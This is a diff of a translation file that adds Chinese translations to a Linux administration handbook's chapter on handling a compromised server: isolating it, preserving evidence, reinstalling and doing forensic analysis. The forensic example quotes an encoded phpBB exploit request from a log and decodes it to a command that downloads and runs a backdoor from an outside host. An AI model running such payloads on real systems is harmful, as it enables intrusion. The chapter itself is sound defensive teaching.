 "<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>\n"
 "      "
 msgstr ""
+"\n"
+"<computeroutput># </computeroutput><userinput>ls -al /proc/3719/exe</userinput>\n"
+"<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>\n"
+"      "
 
 #. Tag: para
 #, no-c-format
 msgid "A program installed under <filename>/var/tmp/</filename> and running as the web server? No doubt left, the machine is compromised."
-msgstr ""
+msgstr "一个程序安装在 <filename>/var/tmp/</filename> 并作为网页服务器运行？毋庸置疑，机器已经被攻陷了。"
 
 #. Tag: para
 #, no-c-format
 msgid "This is only one example, but many other hints can ring the administrator's bell:"
-msgstr ""
+msgstr "此处只是一个示例，但是其他提示也会给管理员敲响警钟："
 
 #. Tag: para
 #, no-c-format
 msgid "an option to a command that no longer works; the version of the software that the command claims to be doesn't match the version that is supposed to be installed according to <command>dpkg</command>;"
-msgstr ""
+msgstr "命令的某个选项不起作用了；命令自己声明的软件版本与根据 <command>dpkg</command> 安装的预期版本不一致；"
 
 #. Tag: para
 #, no-c-format
 msgid "a command prompt or a session greeting indicating that the last connection came from an unknown server on another continent;"
-msgstr ""
+msgstr "命令行提示或者会话问候显示最后的连接源于其他洲的未知服务器；"
 
 #. Tag: para
 #, no-c-format
 msgid "errors caused by the <filename>/tmp/</filename> partition being full, which turned out to be full of illegal copies of movies;"
-msgstr ""
+msgstr "<filename>/tmp/</filename> 分区已经被错误填满，而且都是由于非法的电影拷贝产生的；"
 
 #. Tag: para
 #, no-c-format
 msgid "and so on."
-msgstr ""
+msgstr "等等。"
 
 #. Tag: title
 #, no-c-format
 msgid "Putting the Server Off-Line"
-msgstr ""
+msgstr "把服务器下线"
 
 #. Tag: para
 #, no-c-format
 msgid "In any but the most exotic cases, the cracking comes from the network, and the attacker needs a working network to reach their targets (access confidential data, share illegal files, hide their identity by using the machine as a relay, and so on). Unplugging the computer from the network will prevent the attacker from reaching these targets, if they haven't managed to do so yet."
-msgstr ""
+msgstr "除了非常特殊的情况，破解一般源于网络，攻击者需要连接网络达到目的地（读取机密数据，共享非法文件，使用中继隐藏身份，等等）。将计算机从网络上拔出会阻止攻击者达到这些目标，即使是他们还没能成功攻陷电脑。"
 
 #. Tag: para
 #, no-c-format
 msgid "This may only be possible if the server is physically accessible. When the server is hosted in a hosting provider's data center halfway across the country, or if the server is not accessible for any other reason, it's usually a good idea to start by gathering some important information (see following sections), then isolating that server as much as possible by shutting down as many services as possible (usually, everything but <command>sshd</command>). This case is still awkward, since one can't rule out the possibility of the attacker having SSH access like the administrator has; this makes it harder to “clean” the machines."
-msgstr ""
+msgstr "这些只有在服务器可以物理访问时才有可能。如果服务器是位于半个国家之外的托管供应商数据中心，或者因为其他原因不能接近服务器，最好是先收集一些重要信息（参考随后章节），然后通过关闭尽可能多的服务，隔离尽可能多的服务器（通常，是除了 <command>sshd</command> 之外的所有服务）。这种情况仍然比较尴尬，因为你不能确定攻击者是否像管理员一样具有 SSH 访问权限；从而使清理机器更困难。"
 
 #. Tag: title
 #, no-c-format
 msgid "Keeping Everything that Could Be Used as Evidence"
-msgstr ""
+msgstr "保留所有可以作为证据的东西"
 
 #. Tag: para
 #, no-c-format
 msgid "Understanding the attack and/or engaging legal action against the attackers requires taking copies of all the important elements; this includes the contents of the hard disk, a list of all running processes, and a list of all open connections. The contents of the RAM could also be used, but it is rarely used in practice."
-msgstr ""
+msgstr "要知道针对攻击者的反击和从事法律活动需要所有重要元素的复本；包括硬盘内容，所有允许进程的清单，所有打开连接的清单。RAM 的内容也可以被使用，但是实践中很少使用。"
 
 #. Tag: para
 #, no-c-format
 msgid "In the heat of action, administrators are often tempted to perform many checks on the compromised machine; this is usually not a good idea. Every command is potentially subverted and can erase pieces of evidence. The checks should be restricted to the minimal set (<command>netstat -tupan</command> for network connections, <command>ps auxf</command> for a list of processes, <command>ls -alR /proc/[0-9]*</command> for a little more information on running programs), and every performed check should carefully be written down."
-msgstr ""
+msgstr "在斗争最激烈的时候，管理员往往倾向于在感染电脑上执行许多检查；这通常不是一个好主意。每个命令都有可能已经被更改了并有可能擦除证据片段。检查应该限制在最小范围内（对于网络连接 <command>netstat -tupan</command>，列出所有进程 <command>ps auxf</command>，正在运行程序的信息 <command>ls -alR /proc/[0-9]*</command>），每个已进行过的检查都要仔细记下来。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>CAUTION</emphasis> Hot analysis"
-msgstr ""
+msgstr "<emphasis>注意</emphasis> 在线分析"
 
 #. Tag: para
 #, no-c-format
 msgid "While it may seem tempting to analyze the system as it runs, especially when the server is not physically reachable, this is best avoided: quite simply you can't trust the programs currently installed on the compromised system. It's quite possible for a subverted <command>ps</command> command to hide some processes, or for a subverted <command>ls</command> to hide files; sometimes even the kernel is compromised!"
-msgstr ""
+msgstr "尽管在运行时分析系统看起来很有诱惑力，特别是在不能接近服务器的时候，但是最好避免这种情况：原因很简单，你不能信任当前安装在被感染系统上的任何程序。被更改的 <command>ps</command> 命令很容易就能隐藏一些进程，或者被更改的 <command>ls</command> 隐藏一些文件，有时候甚至内核也可能被感染！"
 
 #. Tag: para
 #, no-c-format
 msgid "If such a hot analysis is still required, care should be taken to only use known-good programs. A good way to do that would be to have a rescue CD with pristine programs, or a read-only network share. However, even those countermeasures may not be enough if the kernel itself is compromised."
-msgstr ""
+msgstr "如果仍然需要在线分析，要注意只使用已知的可信任程序。比较好的方法是使用含有简单程序的救援 CD，或者只读的网络共享。然而，如果内核本身被感染，这些措施也无济于事。"
 
 #. Tag: para
 #, no-c-format
 msgid "Once the “dynamic” elements have been saved, the next step is to store a complete image of the hard-disk. Making such an image is impossible if the filesystem is still evolving, which is why it must be remounted read-only. The simplest solution is often to halt the server brutally (after running <command>sync</command>) and reboot it on a rescue CD. Each partition should be copied with a tool such as <command>dd</command>; these images can be sent to another server (possibly with the very convenient <command>nc</command> tool). Another possibility may be even simpler: just get the disk out of the machine and replace it with a new one that can be reformatted and reinstalled."
-msgstr ""
+msgstr "一旦“动态”元素已经被保存，下一步就是存储整个硬盘镜像。如果文件系统仍在变化，是不可能制作镜像的，就需要以只读方式挂载。最简单的办法是（在运行 <command>sync</command> 后）直接停机并使用救援 CD 重启系统。每个分区使用类似 <command>dd</command> 来拷贝；这些镜像可以发送到其他服务器（可以使用很方便的 <command>nc</command> 工具）。另一种可能更简单：把磁盘从机器里取出来并使用新的替代它，从新格式化，重装系统。"
 
 #. Tag: title
 #, no-c-format
 msgid "Re-installing"
-msgstr ""
+msgstr "重新安装"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>backdoor</primary>"
-msgstr ""
+msgstr "<primary>后门</primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "The server should not be brought back on line without a complete reinstallation. If the compromise was severe (if administrative privileges were obtained), there is almost no other way to be sure that we're rid of everything the attacker may have left behind (particularly <emphasis>backdoors</emphasis>). Of course, all the latest security updates must also be applied so as to plug the vulnerability used by the attacker. Ideally, analyzing the attack should point at this attack vector, so one can be sure of actually fixing it; otherwise, one can only hope that the vulnerability was one of those fixed by the updates."
-msgstr ""
+msgstr "如果没有完全重装，不要让服务器恢复在线。如果问题很严重（管理员权限被获得），几乎没有办法可以确保完全清除攻击者留下的东西（特别是 <emphasis>后门－backdoors</emphasis>）。当然，所有最新的安全补丁都要更新，以便移除攻击者所利用的漏洞。理想情况下，分析攻击应针对攻击向量，以便确定是否修复；否则，只能希望漏洞能被某个更新所修复。"
 
 #. Tag: para
 #, no-c-format
 msgid "Reinstalling a remote server is not always easy; it may involve assistance from the hosting company, because not all such companies provide automated reinstallation systems. Care should be taken not to reinstall the machine from backups taken later than the compromise. Ideally, only data should be restored, the actual software should be reinstalled from the installation media."
-msgstr ""
+msgstr "从新安装远程服务器并不容易；可能要托管公司协助，因为并不是所有公司都提供自动重装系统。注意，不要使用被感染之后的系统备份来安装机器。只有数据应当被恢复，实际使用的软件应该从安装媒介重新安装。"
 
 #. Tag: title
 #, no-c-format
 msgid "Forensic Analysis"
-msgstr ""
+msgstr "法医分析"
 
 #. Tag: para
 #, no-c-format
 msgid "Now that the service has been restored, it is time to have a closer look at the disk images of the compromised system in order to understand the attack vector. When mounting these images, care should be taken to use the <literal>ro,nodev,noexec,noatime</literal> options so as to avoid changing the contents (including timestamps of access to files) or running compromised programs by mistake."
-msgstr ""
+msgstr "现在服务被恢复，是时候看看感染系统的磁盘镜像，找到攻击向量了。当加载这些镜像是，注意使用 <literal>ro,nodev,noexec,noatime</literal> 选项来避免改变其内容（包括读取文件的时间戳）或者误运行感染程序。"
 
 #. Tag: para
 #, no-c-format
 msgid "Retracing an attack scenario usually involves looking for everything that was modified and executed:"
-msgstr ""
+msgstr "追踪痕迹通常需要寻找任何被更改和执行的东西："
 
 #. Tag: para
 #, no-c-format
 msgid "<filename>.bash_history</filename> files often provide for a very interesting read;"
-msgstr ""
+msgstr "<filename>.bash_history</filename> 文件可用于查阅；"
 
 #. Tag: para
 #, no-c-format
 msgid "so does listing files that were recently created, modified or accessed;"
-msgstr ""
+msgstr "也会列出最近创建，修改和读取的文件；"
 
 #. Tag: para
 #, no-c-format
 msgid "the <command>strings</command> command helps identifying programs installed by the attacker, by extracting text strings from a binary;"
-msgstr ""
+msgstr "<command>strings</command> 通过从二进制中提取字符串，可辅助用于识别攻击者安装的程序。"
 
 #. Tag: para
 #, no-c-format
 msgid "the log files in <filename>/var/log/</filename> often allow reconstructing a chronology of events;"
-msgstr ""
+msgstr "<filename>/var/log/</filename> 日志文件可重建事件记录；"
 
 #. Tag: para
 #, no-c-format
 msgid "special-purpose tools also allow restoring the contents of potentially deleted files, including log files that attackers often delete."
-msgstr ""
+msgstr "特殊用途的工具可用于恢复潜在被删除的文件，包括攻击者删除的日志文件。"
 
 #. Tag: para
 #, no-c-format
 msgid "Some of these operations can be made easier with specialized software. In particular, <emphasis>The Coroner Toolkit</emphasis> (in the <emphasis role=\"pkg\">tct</emphasis> package) is a collection of such tools. It includes several tools; amongst these, <command>grave-robber</command> can collect data from a running compromised system, <command>lazarus</command> extracts often interesting data from non-allocated regions on disks, and <command>pcat</command> can copy the memory used by a process; other data extraction tools are also included. <indexterm><primary>The Coroner Toolkit</primary></indexterm>"
-msgstr ""
+msgstr "可以使用特殊的软件让操作变得更简单。<emphasis>The Coroner Toolkit</emphasis> （在 <emphasis role=\"pkg\">tct</emphasis> 软件包中）是此类工具的集合。包括几种工具；其中 <command>grave-robber</command> 可以从正在运行的感染系统中收集数据，<command>lazarus</command> 可以从磁盘上未分配区域提取感兴趣的数据，<command>pcat</command> 可以复制某个进程的内存；其中也包含了其他数据提取工具。<indexterm><primary>The Coroner Toolkit</primary></indexterm>"
 
 #. Tag: para
 #, no-c-format
 msgid "The <emphasis role=\"pkg\">sleuthkit</emphasis> package provides a few other tools to analyze a filesystem. Their use is made easier by the <emphasis>Autopsy Forensic Browser</emphasis> graphical interface (in the <emphasis role=\"pkg\">autopsy</emphasis> package). <indexterm><primary>Autopsy Forensic Browser</primary></indexterm>"
-msgstr ""
+msgstr "<emphasis role=\"pkg\">sleuthkit</emphasis> 软件包提供一些其他工具用于文件系统。通过 <emphasis>Autopsy Forensic Browser</emphasis> 图形界面（在 <emphasis role=\"pkg\">autopsy</emphasis> 软件包中）可以使其操作简单化。<indexterm><primary>Autopsy Forensic Browser</primary></indexterm>"
 
 #. Tag: title
 #, no-c-format
 msgid "Reconstituting the Attack Scenario"
-msgstr ""
+msgstr "重构攻击场景"
 
 #. Tag: para
 #, no-c-format
 msgid "All the elements collected during the analysis should fit together like pieces in a jigsaw puzzle; the creation of the first suspect files is often correlated with logs proving the breach. A real-world example should be more explicit than long theoretical ramblings."
-msgstr ""
+msgstr "在分析过程中搜集到的所有元素应该像拼图一片一片组合起来；第一个可疑文件通常和提供突破口的日志文件相关。现实世界中的例子比冗长的理论明了。"
 
 #. Tag: para
 #, no-c-format
 msgid "The following log is an extract from an Apache <filename>access.log</filename>:"
-msgstr ""
+msgstr "下面的日志文件截取自 Apache <filename>access.log</filename>："
 
 #. Tag: programlisting
 #, no-c-format
@@ -2267,21 +2424,24 @@ msgid ""
 "www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] \"GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1\" 200 27969 \"-\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\"\n"
 "      "
 msgstr ""
+"\n"
+"www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] \"GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1\" 200 27969 \"-\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\"\n"
+"      "
 
 #. Tag: para
 #, no-c-format
 msgid "This example matches exploitation of an old security vulnerability in phpBB. <ulink type=\"block\" url=\"http://secunia.com/advisories/13239/\" /> <ulink type=\"block\" url=\"http://www.phpbb.com/phpBB/viewtopic.php?t=240636\" />"
-msgstr ""
+msgstr "这个例子正是利用了 phpBB 中的一个老安全漏洞。<ulink type=\"block\" url=\"http://secunia.com/advisories/13239/\" /> <ulink type=\"block\" url=\"http://www.phpbb.com/phpBB/viewtopic.php?t=240636\" />"
 
 #. Tag: para
 #, no-c-format
 msgid "Decoding this long URL leads to understanding that the attacker managed to run some PHP code, namely: <command>system(\"cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;\")</command>. Indeed, a <filename>bd</filename> file was found in <filename>/tmp/</filename>. Running <command>strings /mnt/tmp/bd</command> returns, among other strings, <literal>PsychoPhobia Backdoor is starting...</literal>. This really looks like a backdoor."
-msgstr ""
+msgstr "破译这段 URL 就会明白，攻击者成功运行了一些 PHP 代码，即：<command>system(\"cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;\")</command>。实际上，在<filename>/tmp/</filename>会发现一个 <filename>bd</filename> 文件。运行 <command>strings /mnt/tmp/bd</command> 会发现字符串 <literal>PsychoPhobia Backdoor is starting...</literal>。这也确实看起来像个后门。"
 
 #. Tag: para
 #, no-c-format
 msgid "Some time later, this access was used to download, install and run an IRC <emphasis>bot</emphasis> that connected to an underground IRC network. The bot could then be controlled via this protocol and instructed to download files for sharing. This program even has its own log file:"
-msgstr ""
+msgstr "随后，访问权限会被用来下载，安装和运行连接到地下 IRC 网络的 <emphasis>机器人－bot</emphasis>。这个机器人通过 IRC 协议控制，用于下载文件并共享。程序甚至有自己的日志文件："
 
 #. Tag: programlisting
 #, no-c-format
@@ -2300,18 +2460,31 @@ msgid ""
 "(...)\n"
 "** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)\n"
 msgstr ""
+"** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)\n"
+"** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT\n"
+"** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024\n"
+"** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating\n"
+"** 2004-11-29-19:50:20: DCC CHAT Correct password\n"
+"(...)\n"
+"** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)\n"
+"(...)\n"
+"** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)\n"
+"(...)\n"
+"** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)\n"
+"(...)\n"
+"** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)\n"
 
 #. Tag: para
 #, no-c-format
 msgid "These traces show that two video files have been stored on the server by way of the 82.50.72.202 IP address."
-msgstr ""
+msgstr "跟踪记录显示有两个视频文件被存储在服务器上了。"
 
 #. Tag: para
 #, no-c-format
 msgid "In parallel, the attacker also downloaded a pair of extra files, <filename>/tmp/pt</filename> and <filename>/tmp/loginx</filename>. Running these files through <command>strings</command> leads to strings such as <foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> and <foreignphrase>Now wait for suid shell...</foreignphrase>. These look like programs exploiting local vulnerabilities to obtain administrative privileges. Did they reach their target? In this case, probably not, since no files seem to have been modified after the initial breach."
-msgstr ""
+msgstr "同时，攻击者也下载了一对额外文件，<filename>/tmp/pt</filename> 和 <filename>/tmp/loginx</filename>。运行 <command>strings</command> 命令分析文件会发现诸如<foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> 和 <foreignphrase>Now wait for suid shell...</foreignphrase>。这些看起来像是程序利用本地漏洞获取管理员特权。他们达到目的了吗？本例中，视乎没有，因为在他们开始活动之后，看起来没有文件被修改。"
 
 #. Tag: para
 #, no-c-format
 msgid "In this example, the whole intrusion has been reconstructed, and it can be deduced that the attacker has been able to take advantage of the compromised system for about three days; but the most important element in the analysis is that the vulnerability has been identified, and the administrator can be sure that the new installation really does fix the vulnerability."
-msgstr ""
+msgstr "本例中，整个入侵过程被重构。可以推断，攻击者已经能够利用被侵入的系统三天左右；分析的成果在于漏洞已经被识别出来，并且管理员可以确保在下一次安装时确实修复了该漏洞。"
